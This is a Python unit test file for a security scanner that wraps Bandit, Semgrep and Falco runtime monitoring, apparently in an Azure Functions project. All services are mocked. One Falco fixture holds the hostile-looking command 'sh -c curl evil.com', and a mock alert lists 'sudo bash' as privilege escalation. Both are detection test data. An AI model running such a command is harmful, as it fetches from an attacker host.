"""Unit tests for the security scanner module.

This module contains tests for the security scanning, runtime monitoring,
and security reporting features of the Data Management Agent.
"""

import unittest
from unittest.mock import patch, MagicMock, ANY
import json
import os
from datetime import datetime, timedelta

import azure.functions as func

from security_scanner import SecurityScanner, security_scanner_func, scan_all_code_for_tenant
from shared.models.security import Severity, FindingType, SecurityFinding, RuntimeAlert


class TestSecurityScanner(unittest.TestCase):
    """Test cases for the SecurityScanner class."""

    def setUp(self):
        """Set up test fixtures."""
        # Mock the external services
        self.cosmos_patch = patch('security_scanner.CosmosClient')
        self.blob_patch = patch('security_scanner.BlobServiceClient')
        self.bandit_config_patch = patch('security_scanner.bandit_config')
        self.bandit_manager_patch = patch('security_scanner.bandit_manager')
        self.semgrep_patch = patch('security_scanner.semgrep')
        self.falco_patch = patch('security_scanner.falco')
        
        self.mock_cosmos = self.cosmos_patch.start()
        self.mock_blob = self.blob_patch.start()
        self.mock_bandit_config = self.bandit_config_patch.start()
        self.mock_bandit_manager = self.bandit_manager_patch.start()
        self.mock_semgrep = self.semgrep_patch.start()
        self.mock_falco = self.falco_patch.start()
        
        # Configure mock responses
        self.mock_database = MagicMock()
        self.mock_container = MagicMock()
        self.mock_cosmos.return_value.get_database_client.return_value = self.mock_database
        self.mock_database.get_container_client.return_value = self.mock_container
        
        self.mock_blob_client = MagicMock()
        self.mock_blob.from_connection_string.return_value = self.mock_blob_client
        self.mock_blob_container = MagicMock()
        self.mock_blob_client.get_container_client.return_value = self.mock_blob_container
        
        # Mock config loading
        config_blob = MagicMock()
        self.mock_blob_container.get_blob_client.return_value = config_blob
        config_blob.download_blob.return_value.readall.side_effect = Exception("Config not found")
        
        # Initialize scanner
        self.scanner = SecurityScanner("test-tenant")
        
        # Set up test data
        self.test_code_path = "/tmp/test-code"
        
    def tearDown(self):
        """Tear down test fixtures."""
        self.cosmos_patch.stop()
        self.blob_patch.stop()
        self.bandit_config_patch.stop()
        self.bandit_manager_patch.stop()
        self.semgrep_patch.stop()
        self.falco_patch.stop()
    
    def test_scan_code_with_bandit_findings(self):
        """Test code scanning with Bandit findings."""
        # Mock Bandit findings
        mock_issue = MagicMock()
        mock_issue.severity = "HIGH"
        mock_issue.text = "Insecure code detected"
        mock_issue.fname = "test.py"
        mock_issue.lineno = 42
        mock_issue.test_id = "B123"
        
        mock_manager = MagicMock()
        mock_manager.get_issue_list.return_value = [mock_issue]
        self.mock_bandit_manager.BanditManager.return_value = mock_manager
        
        # Mock Semgrep findings (empty for this test)
        self.mock_semgrep.scan.return_value = {"results": []}
        
        # Run the scanner
        result = self.scanner.scan_code(self.test_code_path)
        
        # Verify the scanner found the issue
        self.assertEqual(1, result.findings_count)
        self.assertEqual(1, result.high_severity_count)
        self.assertEqual(0, result.medium_severity_count)
        self.assertEqual(0, result.low_severity_count)
        
        # Verify the finding details
        finding = result.findings[0]
        self.assertEqual(Severity.HIGH, finding.severity)
        self.assertEqual(FindingType.CODE_VULNERABILITY, finding.finding_type)
        self.assertEqual("Insecure code detected", finding.description)
        self.assertEqual("test.py:42", finding.location)
        self.assertEqual("Fix B123 issue: Insecure code detected", finding.recommendation)
        
        # Verify the finding was stored
        self.mock_container.upsert_item.assert_called()
    
    def test_scan_code_with_semgrep_findings(self):
        """Test code scanning with Semgrep findings."""
        # Mock Bandit findings (empty for this test)
        mock_manager = MagicMock()
        mock_manager.get_issue_list.return_value = []
        self.mock_bandit_manager.BanditManager.return_value = mock_manager
        
        # Mock Semgrep findings
        semgrep_result = {
            "results": [
                {
                    "check_id": "test-rule",
                    "path": "app.py",
                    "start": {"line": 10},
                    "extra": {"lines": "print(user_input)"},
                    "message": "User input is used without sanitization",
                    "severity": "ERROR"
                }
            ]
        }
        self.mock_semgrep.scan.return_value = semgrep_result
        
        # Run the scanner
        result = self.scanner.scan_code(self.test_code_path)
        
        # Verify the scanner found the issue
        self.assertEqual(1, result.findings_count)
        self.assertEqual(1, result.high_severity_count)
        self.assertEqual(0, result.medium_severity_count)
        self.assertEqual(0, result.low_severity_count)
        
        # Verify the finding details
        finding = result.findings[0]
        self.assertEqual(Severity.HIGH, finding.severity)
        self.assertEqual(FindingType.CODE_VULNERABILITY, finding.finding_type)
        self.assertEqual("User input is used without sanitization", finding.description)
        self.assertEqual("app.py:10", finding.location)
        self.assertEqual("print(user_input)", finding.code_snippet)
        
        # Verify the finding was stored
        self.mock_container.upsert_item.assert_called()
    
    def test_monitor_runtime(self):
        """Test runtime monitoring."""
        # Mock Falco events
        mock_event = MagicMock()
        mock_event.priority = 8  # High severity
        mock_event.output = "Suspicious process execution"
        mock_event.source = "container"
        mock_event.rule = "detect_suspicious_process"
        mock_event.process = "sh -c curl evil.com"
        
        mock_falco_client = MagicMock()
        mock_falco_client.get_events.return_value = [mock_event]
        self.mock_falco.Client.return_value = mock_falco_client
        
        # Run the monitor
        alerts = self.scanner.monitor_runtime()
        
        # Verify the monitor found the issue
        self.assertEqual(1, len(alerts))
        
        # Verify the alert details
        alert = alerts[0]
        self.assertEqual(Severity.HIGH, alert.severity)
        self.assertEqual("Suspicious process execution", alert.description)
        self.assertEqual("container", alert.resource)
        self.assertEqual("detect_suspicious_process", alert.rule_name)
        self.assertEqual("sh -c curl evil.com", alert.process)
        
        # Verify the alert was stored
        self.mock_database.get_container_client.assert_any_call("security_alerts")
    
    def test_generate_security_report(self):
        """Test security report generation."""
        # Mock findings and alerts in Cosmos DB
        start_date = datetime.now() - timedelta(days=7)
        end_date = datetime.now()
        
        # Create mock findings
        mock_findings = [
            {
                "finding_id": "finding1",
                "finding_type": FindingType.CODE_VULNERABILITY.value,
                "severity": Severity.HIGH.value,
                "description": "SQL Injection",
                "location": "app.py:42",
                "detected_at": start_date.isoformat()
            },
            {
                "finding_id": "finding2",
                "finding_type": FindingType.CODE_VULNERABILITY.value,
                "severity": Severity.MEDIUM.value,
                "description": "Weak crypto",
                "location": "crypto.py:21",
                "detected_at": start_date.isoformat()
            }
        ]
        
        # Create mock alerts
        mock_alerts = [
            {
                "alert_id": "alert1",
                "severity": Severity.HIGH.value,
                "description": "Privilege escalation",
                "resource": "container-123",
                "detected_at": start_date.isoformat(),
                "rule_name": "privilege_escalation",
                "process": "sudo bash"
            }
        ]
        
        # Configure mock query responses
        findings_query_result = MagicMock()
        findings_query_result.__iter__.return_value = iter(mock_findings)
        self.mock_container.query_items.return_value = findings_query_result
        
        alerts_query_result = MagicMock()
        alerts_query_result.__iter__.return_value = iter(mock_alerts)
        self.mock_database.get_container_client.return_value.query_items.return_value = alerts_query_result
        
        # Run the report generator
        report = self.scanner.generate_security_report(start_date, end_date)
        
        # Verify the report content
        self.assertEqual("test-tenant", report.tenant_id)
        self.assertEqual(start_date, report.start_date)
        self.assertEqual(end_date, report.end_date)
        self.assertEqual(2, report.total_findings)
        self.assertEqual(1, report.total_alerts)
        self.assertEqual(1, report.high_severity_findings)
        self.assertEqual(1, report.medium_severity_findings)
        self.assertEqual(0, report.low_severity_findings)
        self.assertEqual(1, report.high_severity_alerts)
        self.assertEqual(0, report.medium_severity_alerts)
        self.assertEqual(0, report.low_severity_alerts)
        
        # Verify the risk score calculation
        self.assertEqual(2, report.high_severity_total)
        self.assertEqual(1, report.medium_severity_total)
        self.assertEqual(0, report.low_severity_total)
        self.assertEqual(25, report.risk_score)  # (2 * 10) + (1 * 5) = 25
        self.assertEqual("WARNING", report.security_status)
        
        # Verify the report was stored
        self.mock_database.get_container_client.assert_any_call("security_reports")


class TestSecurityScannerFunc(unittest.TestCase):
    """Test cases for the security_scanner_func Azure Function."""
    
    @patch('security_scanner.get_current_user')
    @patch('security_scanner.validate_tenant_access')
    @patch('security_scanner.SecurityScanner')
    def test_scan_code_action(self, mock_scanner_class, mock_validate_access, mock_get_user):
        """Test the scan_code action in the Azure Function."""
        # Setup mocks
        mock_get_user.return_value = {"id": "user1", "name": "Test User"}
        mock_validate_access.return_value = True
        
        mock_scanner = MagicMock()
        mock_scanner_class.return_value = mock_scanner
        
        mock_scan_result = MagicMock()
        mock_scan_result.__dict__ = {
            "scan_id": "test-scan-id",
            "findings_count": 1,
            "high_severity_count": 1
        }
        mock_scanner.scan_code.return_value = mock_scan_result
        
        # Create mock request
        req_body = {
            "action": "scan_code",
            "code_path": "/tmp/test-code"
        }
        req = func.HttpRequest(
            method='POST',
            url='/api/security-scanner/test-tenant',
            body=json.dumps(req_body).encode(),
            headers={'Content-Type': 'application/json'},
            route_params={"tenant_id": "test-tenant"}
        )
        
        # Execute function
        response = security_scanner_func(req)
        
        # Verify response
        self.assertEqual(200, response.status_code)
        self.assertEqual("application/json", response.mimetype)
        
        # Verify scanner was called correctly
        mock_scanner_class.assert_called_once_with("test-tenant")
        mock_scanner.scan_code.assert_called_once_with("/tmp/test-code")
    
    @patch('security_scanner.get_current_user')
    @patch('security_scanner.validate_tenant_access')
    @patch('security_scanner.scan_all_code_for_tenant')
    def test_scan_all_code_action(self, mock_scan_all, mock_validate_access, mock_get_user):
        """Test the scan_all_code action in the Azure Function."""
        # Setup mocks
        mock_get_user.return_value = {"id": "user1", "name": "Test User"}
        mock_validate_access.return_value = True
        
        mock_scan_result = MagicMock()
        mock_scan_result.__dict__ = {
            "scan_id": "test-scan-id",
            "findings_count": 2,
            "high_severity_count": 1
        }
        mock_scan_all.return_value = {"repo1": mock_scan_result}
        
        # Create mock request
        req_body = {
            "action": "scan_all_code"
        }
        req = func.HttpRequest(
            method='POST',
            url='/api/security-scanner/test-tenant',
            body=json.dumps(req_body).encode(),
            headers={'Content-Type': 'application/json'},
            route_params={"tenant_id": "test-tenant"}
        )
        
        # Execute function
        response = security_scanner_func(req)
        
        # Verify response
        self.assertEqual(200, response.status_code)
        self.assertEqual("application/json", response.mimetype)
        
        # Verify scanner was called correctly
        mock_scan_all.assert_called_once_with("test-tenant")
    
    @patch('security_scanner.get_current_user')
    @patch('security_scanner.validate_tenant_access')
    @patch('security_scanner.SecurityScanner')
    def test_monitor_runtime_action(self, mock_scanner_class, mock_validate_access, mock_get_user):
        """Test the monitor_runtime action in the Azure Function."""
        # Setup mocks
        mock_get_user.return_value = {"id": "user1", "name": "Test User"}
        mock_validate_access.return_value = True
        
        mock_scanner = MagicMock()
        mock_scanner_class.return_value = mock_scanner
        
        mock_alert = MagicMock()
        mock_alert.__dict__ = {
            "alert_id": "test-alert-id",
            "severity": Severity.HIGH,
            "description": "Suspicious activity"
        }
        mock_scanner.monitor_runtime.return_value = [mock_alert]
        
        # Create mock request
        req_body = {
            "action": "monitor_runtime"
        }
        req = func.HttpRequest(
            method='POST',
            url='/api/security-scanner/test-tenant',
            body=json.dumps(req_body).encode(),
            headers={'Content-Type': 'application/json'},
            route_params={"tenant_id": "test-tenant"}
        )
        
        # Execute function
        response = security_scanner_func(req)
        
        # Verify response
        self.assertEqual(200, response.status_code)
        self.assertEqual("application/json", response.mimetype)
        
        # Verify scanner was called correctly
        mock_scanner_class.assert_called_once_with("test-tenant")
        mock_scanner.monitor_runtime.assert_called_once()
    
    @patch('security_scanner.get_current_user')
    @patch('security_scanner.validate_tenant_access')
    @patch('security_scanner.SecurityScanner')
    def test_generate_report_action(self, mock_scanner_class, mock_validate_access, mock_get_user):
        """Test the generate_report action in the Azure Function."""
        # Setup mocks
        mock_get_user.return_value = {"id": "user1", "name": "Test User"}
        mock_validate_access.return_value = True
        
        mock_scanner = MagicMock()
        mock_scanner_class.return_value = mock_scanner
        
        mock_report = MagicMock()
        mock_report.__dict__ = {
            "report_id": "test-report-id",
            "total_findings": 3,
            "risk_score": 25
        }
        mock_scanner.generate_security_report.return_value = mock_report
        
        # Create mock request
        today = datetime.now()
        week_ago = today - timedelta(days=7)
        req_body = {
            "action": "generate_report",
            "start_date": week_ago.isoformat(),
            "end_date": today.isoformat()
        }
        req = func.HttpRequest(
            method='POST',
            url='/api/security-scanner/test-tenant',
            body=json.dumps(req_body).encode(),
            headers={'Content-Type': 'application/json'},
            route_params={"tenant_id": "test-tenant"}
        )
        
        # Execute function
        response = security_scanner_func(req)
        
        # Verify response
        self.assertEqual(200, response.status_code)
        self.assertEqual("application/json", response.mimetype)
        
        # Verify scanner was called correctly
        mock_scanner_class.assert_called_once_with("test-tenant")
        mock_scanner.generate_security_report.assert_called_once_with(ANY, ANY)


class TestScanAllCodeForTenant(unittest.TestCase):
    """Test cases for the scan_all_code_for_tenant function."""
    
    @patch('security_scanner.BlobServiceClient')
    @patch('security_scanner.SecurityScanner')
    @patch('os.makedirs')
    @patch('builtins.open', new_callable=unittest.mock.mock_open)
    def test_scan_all_repositories(self, mock_open, mock_makedirs, mock_scanner_class, mock_blob):
        """Test scanning all code repositories for a tenant."""
        # Setup mocks
        mock_scanner = MagicMock()
        mock_scanner_class.return_value = mock_scanner
        
        mock_scan_result = MagicMock()
        mock_scanner.scan_code.return_value = mock_scan_result
        
        # Mock blob storage
        mock_blob_client = MagicMock()
        mock_blob.from_connection_string.return_value = mock_blob_client
        
        mock_container = MagicMock()
        mock_blob_client.get_container_client.return_value = mock_container
        
        # Mock repository listing
        mock_blob1 = MagicMock()
        mock_blob1.name = "repo1/file1.py"
        
        mock_blob2 = MagicMock()
        mock_blob2.name = "repo1/file2.py"
        
        mock_blob3 = MagicMock()
        mock_blob3.name = "repo2/file1.py"
        
        mock_container.list_blobs.side_effect = [
            [mock_blob1, mock_blob2, mock_blob3],  # First call to list all blobs
            [mock_blob1, mock_blob2],              # Listing repo1 blobs
            [mock_blob3]                           # Listing repo2 blobs
        ]
        
        # Mock blob content
        mock_blob_content = MagicMock()
        mock_container.get_blob_client.return_value = mock_blob_content
        
        # Execute function
        results = scan_all_code_for_tenant("test-tenant")
        
        # Verify results
        self.assertEqual(2, len(results))
        self.assertIn("repo1", results)
        self.assertIn("repo2", results)
        self.assertEqual(mock_scan_result, results["repo1"])
        self.assertEqual(mock_scan_result, results["repo2"])
        
        # Verify scanner was called correctly
        self.assertEqual(2, mock_scanner.scan_code.call_count)
        

if __name__ == '__main__':
    unittest.main() 